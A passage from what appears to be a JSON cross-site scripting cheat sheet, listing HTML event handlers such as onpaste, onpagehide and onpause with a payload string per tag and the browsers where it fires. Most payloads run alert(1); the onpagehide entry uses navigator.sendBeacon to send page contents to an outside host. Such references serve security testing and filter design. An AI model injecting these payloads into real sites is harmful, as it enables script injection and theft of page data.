                        "interaction": true
                    }
                ]
            },
            "onmozfullscreenchange": {
                "description": "Fires when a video changes full screen status",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onpagehide": {
                "description": "Fires when the page is changed",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onpagehide=navigator.sendBeacon('\/\/https:\/\/ssl.example.com\/', document.body.innerHTML)>",
                        "browsers": [
                            "chrome",
                            "firefox"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onpageshow": {
                "description": "Fires when the page is shown",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onpageshow=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "frameset",
                        "code": "<frameset onpageshow=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "context": "before_body"
                    }
                ]
            },
            "onpaste": {
                "description": "Requires you paste a piece of text",
                "tags": [
                    {
                        "tag": "input",
                        "code": "<input onpaste=alert(1) value=\"\" autofocus>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "textarea",
                        "code": "<textarea onpaste=alert(1) autofocus><\/textarea>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "a",
                        "code": "<a onpaste=\"alert(1)\" contenteditable>test<\/a>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "abbr",
                        "code": "<abbr onpaste=\"alert(1)\" contenteditable>test<\/abbr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "acronym",
                        "code": "<acronym onpaste=\"alert(1)\" contenteditable>test<\/acronym>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "address",
                        "code": "<address onpaste=\"alert(1)\" contenteditable>test<\/address>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "applet",
                        "code": "<applet onpaste=\"alert(1)\" contenteditable>test<\/applet>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "area",
                        "code": "<area onpaste=\"alert(1)\" contenteditable>test<\/area>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "article",
                        "code": "<article onpaste=\"alert(1)\" contenteditable>test<\/article>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "aside",
                        "code": "<aside onpaste=\"alert(1)\" contenteditable>test<\/aside>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "audio",
                        "code": "<audio onpaste=\"alert(1)\" contenteditable>test<\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "b",
                        "code": "<b onpaste=\"alert(1)\" contenteditable>test<\/b>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "bdi",
                        "code": "<bdi onpaste=\"alert(1)\" contenteditable>test<\/bdi>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "bdo",
                        "code": "<bdo onpaste=\"alert(1)\" contenteditable>test<\/bdo>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "big",
                        "code": "<big onpaste=\"alert(1)\" contenteditable>test<\/big>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "blink",
                        "code": "<blink onpaste=\"alert(1)\" contenteditable>test<\/blink>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "blockquote",
                        "code": "<blockquote onpaste=\"alert(1)\" contenteditable>test<\/blockquote>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "body",
                        "code": "<body onpaste=\"alert(1)\" contenteditable>test<\/body>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "br",
                        "code": "<br onpaste=\"alert(1)\" contenteditable>test<\/br>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "button",
                        "code": "<button onpaste=\"alert(1)\" contenteditable>test<\/button>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "canvas",
                        "code": "<canvas onpaste=\"alert(1)\" contenteditable>test<\/canvas>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "caption",
                        "code": "<caption onpaste=\"alert(1)\" contenteditable>test<\/caption>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "center",
                        "code": "<center onpaste=\"alert(1)\" contenteditable>test<\/center>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "cite",
                        "code": "<cite onpaste=\"alert(1)\" contenteditable>test<\/cite>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "code",
                        "code": "<code onpaste=\"alert(1)\" contenteditable>test<\/code>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "col",
                        "code": "<col onpaste=\"alert(1)\" contenteditable>test<\/col>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "colgroup",
                        "code": "<colgroup onpaste=\"alert(1)\" contenteditable>test<\/colgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "command",
                        "code": "<command onpaste=\"alert(1)\" contenteditable>test<\/command>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "content",
                        "code": "<content onpaste=\"alert(1)\" contenteditable>test<\/content>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "data",
                        "code": "<data onpaste=\"alert(1)\" contenteditable>test<\/data>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "datalist",
                        "code": "<datalist onpaste=\"alert(1)\" contenteditable>test<\/datalist>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dd",
                        "code": "<dd onpaste=\"alert(1)\" contenteditable>test<\/dd>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "del",
                        "code": "<del onpaste=\"alert(1)\" contenteditable>test<\/del>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "details",
                        "code": "<details onpaste=\"alert(1)\" contenteditable>test<\/details>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dfn",
                        "code": "<dfn onpaste=\"alert(1)\" contenteditable>test<\/dfn>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dialog",
                        "code": "<dialog onpaste=\"alert(1)\" contenteditable>test<\/dialog>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dir",
                        "code": "<dir onpaste=\"alert(1)\" contenteditable>test<\/dir>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "div",
                        "code": "<div onpaste=\"alert(1)\" contenteditable>test<\/div>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dl",
                        "code": "<dl onpaste=\"alert(1)\" contenteditable>test<\/dl>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "dt",
                        "code": "<dt onpaste=\"alert(1)\" contenteditable>test<\/dt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "element",
                        "code": "<element onpaste=\"alert(1)\" contenteditable>test<\/element>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "em",
                        "code": "<em onpaste=\"alert(1)\" contenteditable>test<\/em>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "embed",
                        "code": "<embed onpaste=\"alert(1)\" contenteditable>test<\/embed>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "fieldset",
                        "code": "<fieldset onpaste=\"alert(1)\" contenteditable>test<\/fieldset>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "figcaption",
                        "code": "<figcaption onpaste=\"alert(1)\" contenteditable>test<\/figcaption>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "figure",
                        "code": "<figure onpaste=\"alert(1)\" contenteditable>test<\/figure>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "font",
                        "code": "<font onpaste=\"alert(1)\" contenteditable>test<\/font>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "footer",
                        "code": "<footer onpaste=\"alert(1)\" contenteditable>test<\/footer>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "form",
                        "code": "<form onpaste=\"alert(1)\" contenteditable>test<\/form>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "frame",
                        "code": "<frame onpaste=\"alert(1)\" contenteditable>test<\/frame>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "frameset",
                        "code": "<frameset onpaste=\"alert(1)\" contenteditable>test<\/frameset>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true,
                        "context": "before_body"
                    },
                    {
                        "tag": "h1",
                        "code": "<h1 onpaste=\"alert(1)\" contenteditable>test<\/h1>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "head",
                        "code": "<head onpaste=\"alert(1)\" contenteditable style=display:block>test<\/head>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "header",
                        "code": "<header onpaste=\"alert(1)\" contenteditable>test<\/header>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "hgroup",
                        "code": "<hgroup onpaste=\"alert(1)\" contenteditable>test<\/hgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "hr",
                        "code": "<hr onpaste=\"alert(1)\" contenteditable>test<\/hr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "html",
                        "code": "<html onpaste=\"alert(1)\" contenteditable>test<\/html>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "i",
                        "code": "<i onpaste=\"alert(1)\" contenteditable>test<\/i>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "iframe",
                        "code": "<iframe onpaste=\"alert(1)\" contenteditable>test<\/iframe>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "image",
                        "code": "<image onpaste=\"alert(1)\" contenteditable>test<\/image>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "img",
                        "code": "<img onpaste=\"alert(1)\" contenteditable>test<\/img>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ins",
                        "code": "<ins onpaste=\"alert(1)\" contenteditable>test<\/ins>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "kbd",
                        "code": "<kbd onpaste=\"alert(1)\" contenteditable>test<\/kbd>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "keygen",
                        "code": "<keygen onpaste=\"alert(1)\" contenteditable>test<\/keygen>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "label",
                        "code": "<label onpaste=\"alert(1)\" contenteditable>test<\/label>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "legend",
                        "code": "<legend onpaste=\"alert(1)\" contenteditable>test<\/legend>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "li",
                        "code": "<li onpaste=\"alert(1)\" contenteditable>test<\/li>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "listing",
                        "code": "<listing onpaste=\"alert(1)\" contenteditable>test<\/listing>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "main",
                        "code": "<main onpaste=\"alert(1)\" contenteditable>test<\/main>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "map",
                        "code": "<map onpaste=\"alert(1)\" contenteditable>test<\/map>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "mark",
                        "code": "<mark onpaste=\"alert(1)\" contenteditable>test<\/mark>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "marquee",
                        "code": "<marquee onpaste=\"alert(1)\" contenteditable>test<\/marquee>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "menu",
                        "code": "<menu onpaste=\"alert(1)\" contenteditable>test<\/menu>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "menuitem",
                        "code": "<menuitem onpaste=\"alert(1)\" contenteditable>test<\/menuitem>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "meta",
                        "code": "<meta onpaste=\"alert(1)\" contenteditable style=display:block>test<\/meta>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "meter",
                        "code": "<meter onpaste=\"alert(1)\" contenteditable>test<\/meter>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "multicol",
                        "code": "<multicol onpaste=\"alert(1)\" contenteditable>test<\/multicol>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "nav",
                        "code": "<nav onpaste=\"alert(1)\" contenteditable>test<\/nav>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "nextid",
                        "code": "<nextid onpaste=\"alert(1)\" contenteditable>test<\/nextid>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "nobr",
                        "code": "<nobr onpaste=\"alert(1)\" contenteditable>test<\/nobr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "noembed",
                        "code": "<noembed onpaste=\"alert(1)\" contenteditable>test<\/noembed>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "noframes",
                        "code": "<noframes onpaste=\"alert(1)\" contenteditable>test<\/noframes>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "noscript",
                        "code": "<noscript onpaste=\"alert(1)\" contenteditable>test<\/noscript>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "object",
                        "code": "<object onpaste=\"alert(1)\" contenteditable>test<\/object>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ol",
                        "code": "<ol onpaste=\"alert(1)\" contenteditable>test<\/ol>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "optgroup",
                        "code": "<optgroup onpaste=\"alert(1)\" contenteditable>test<\/optgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "option",
                        "code": "<option onpaste=\"alert(1)\" contenteditable>test<\/option>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "output",
                        "code": "<output onpaste=\"alert(1)\" contenteditable>test<\/output>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "p",
                        "code": "<p onpaste=\"alert(1)\" contenteditable>test<\/p>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "param",
                        "code": "<param onpaste=\"alert(1)\" contenteditable>test<\/param>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "picture",
                        "code": "<picture onpaste=\"alert(1)\" contenteditable>test<\/picture>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "plaintext",
                        "code": "<plaintext onpaste=\"alert(1)\" contenteditable>test<\/plaintext>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "pre",
                        "code": "<pre onpaste=\"alert(1)\" contenteditable>test<\/pre>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "progress",
                        "code": "<progress onpaste=\"alert(1)\" contenteditable>test<\/progress>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "q",
                        "code": "<q onpaste=\"alert(1)\" contenteditable>test<\/q>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rb",
                        "code": "<rb onpaste=\"alert(1)\" contenteditable>test<\/rb>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rp",
                        "code": "<rp onpaste=\"alert(1)\" contenteditable>test<\/rp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rt",
                        "code": "<rt onpaste=\"alert(1)\" contenteditable>test<\/rt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "rtc",
                        "code": "<rtc onpaste=\"alert(1)\" contenteditable>test<\/rtc>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ruby",
                        "code": "<ruby onpaste=\"alert(1)\" contenteditable>test<\/ruby>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "s",
                        "code": "<s onpaste=\"alert(1)\" contenteditable>test<\/s>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "samp",
                        "code": "<samp onpaste=\"alert(1)\" contenteditable>test<\/samp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "script",
                        "code": "<script onpaste=\"alert(1)\" contenteditable>test<\/script>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "section",
                        "code": "<section onpaste=\"alert(1)\" contenteditable>test<\/section>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "select",
                        "code": "<select onpaste=\"alert(1)\" contenteditable>test<\/select>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "shadow",
                        "code": "<shadow onpaste=\"alert(1)\" contenteditable>test<\/shadow>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "slot",
                        "code": "<slot onpaste=\"alert(1)\" contenteditable>test<\/slot>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "small",
                        "code": "<small onpaste=\"alert(1)\" contenteditable>test<\/small>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "source",
                        "code": "<source onpaste=\"alert(1)\" contenteditable>test<\/source>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "spacer",
                        "code": "<spacer onpaste=\"alert(1)\" contenteditable>test<\/spacer>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "span",
                        "code": "<span onpaste=\"alert(1)\" contenteditable>test<\/span>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "strike",
                        "code": "<strike onpaste=\"alert(1)\" contenteditable>test<\/strike>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "strong",
                        "code": "<strong onpaste=\"alert(1)\" contenteditable>test<\/strong>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "style",
                        "code": "<style onpaste=\"alert(1)\" contenteditable style=display:block style=display:block>test<\/style>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "sub",
                        "code": "<sub onpaste=\"alert(1)\" contenteditable>test<\/sub>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "summary",
                        "code": "<summary onpaste=\"alert(1)\" contenteditable>test<\/summary>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "sup",
                        "code": "<sup onpaste=\"alert(1)\" contenteditable>test<\/sup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "svg",
                        "code": "<svg onpaste=\"alert(1)\" contenteditable>test<\/svg>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "table",
                        "code": "<table onpaste=\"alert(1)\" contenteditable>test<\/table>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tbody",
                        "code": "<tbody onpaste=\"alert(1)\" contenteditable>test<\/tbody>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "td",
                        "code": "<td onpaste=\"alert(1)\" contenteditable>test<\/td>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "template",
                        "code": "<template onpaste=\"alert(1)\" contenteditable>test<\/template>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tfoot",
                        "code": "<tfoot onpaste=\"alert(1)\" contenteditable>test<\/tfoot>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "th",
                        "code": "<th onpaste=\"alert(1)\" contenteditable>test<\/th>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "thead",
                        "code": "<thead onpaste=\"alert(1)\" contenteditable>test<\/thead>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "time",
                        "code": "<time onpaste=\"alert(1)\" contenteditable>test<\/time>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "title",
                        "code": "<title onpaste=\"alert(1)\" contenteditable>test<\/title>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tr",
                        "code": "<tr onpaste=\"alert(1)\" contenteditable>test<\/tr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "track",
                        "code": "<track onpaste=\"alert(1)\" contenteditable>test<\/track>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "tt",
                        "code": "<tt onpaste=\"alert(1)\" contenteditable>test<\/tt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "u",
                        "code": "<u onpaste=\"alert(1)\" contenteditable>test<\/u>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "ul",
                        "code": "<ul onpaste=\"alert(1)\" contenteditable>test<\/ul>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "var",
                        "code": "<var onpaste=\"alert(1)\" contenteditable>test<\/var>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "video",
                        "code": "<video onpaste=\"alert(1)\" contenteditable>test<\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "wbr",
                        "code": "<wbr onpaste=\"alert(1)\" contenteditable>test<\/wbr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "xmp",
                        "code": "<xmp onpaste=\"alert(1)\" contenteditable>test<\/xmp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onpause": {
                "description": "Requires clicking the element to pause",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video autoplay controls onpause=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "audio",
                        "code": "<audio autoplay controls onpause=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onplay": {
                "description": "Fires when the resource is played",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video autoplay onplay=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
